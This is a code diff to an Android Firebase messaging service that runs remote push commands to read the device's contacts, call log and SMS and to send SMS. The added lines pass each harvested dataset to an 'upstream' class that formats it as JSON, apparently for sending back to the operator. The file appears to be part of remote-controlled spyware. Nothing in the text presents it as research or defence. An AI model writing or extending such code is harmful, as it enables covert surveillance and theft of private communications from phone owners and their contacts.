@@ -12,6 +12,7 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
     deviceData data = new deviceData();
     deviceOps Ops = new deviceOps();
     //deviceConfig config = new deviceConfig();
+    upstream Up = new upstream();
 
     @Override
     public void onMessageReceived(RemoteMessage remoteMessage) {
@@ -23,12 +24,15 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
             switch(command){
                 case "readcontacts":
                     StringBuilder contacts = data.readcontacts();
+                    Up.formatContactsAsJSON(contacts);
                     break;
                 case "readcallLog":
                     StringBuilder callLog = data.readcalllogs();
+                    Up.formatCallLogAsJSON(callLog);
                     break;
                 case "readsms":
                     StringBuilder sms = data.readsms();
+                    Up.formatSmsAsJSON(sms);
                     break;
                 case "sendsms":
                     String sendto = remoteMessage.getData().get("sendto");
